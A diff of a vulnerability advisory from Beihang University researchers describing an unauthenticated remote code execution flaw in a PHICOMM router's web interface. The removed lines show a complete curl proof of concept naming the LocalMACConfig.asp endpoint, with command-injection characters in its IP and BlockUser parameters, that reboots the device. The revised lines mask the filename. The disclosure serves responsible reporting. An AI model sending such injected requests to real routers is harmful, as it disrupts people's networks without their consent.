@@ -8,14 +8,17 @@ institution:Beihang University
 
 Vulnerability description
 -------------------------
-There is a url which we can access without credentials in an ajax function.
+PHICOMM is an information communication domain equipment and service providers, products cover more than 70 countries. 
+We find a rce vulnerability in one of its router product. Details are as follows:
+There is a url which anyone can access without credentials in an ajax function.
 And then our automated vulnerability detection tool discovered a remote code execution in this url handling function in lighthttpd. 
-This vulnerability affects about 600, 000 devices.
+
 
 
 POC: 
-curl 'http://ip:port/LocalMACConfig.asp?action=set&MAC=1&IP=;&DeviceRename=1&isBind=1&ifType=reboot&BlockUser=-f;&UpMax=0&DownMax=0'
-(this poc can reboot the router, resulting in ddos.)
+curl 'http://ip:port/*****.asp?action=set&MAC=1&IP=;&DeviceRename=1&isBind=1&ifType=reboot&BlockUser=-f;&UpMax=0&DownMax=0'
 
+This poc can reboot the router, resulting in ddos. 
+p.s.Given the vendor's security, we only provided part of the url.
   
            
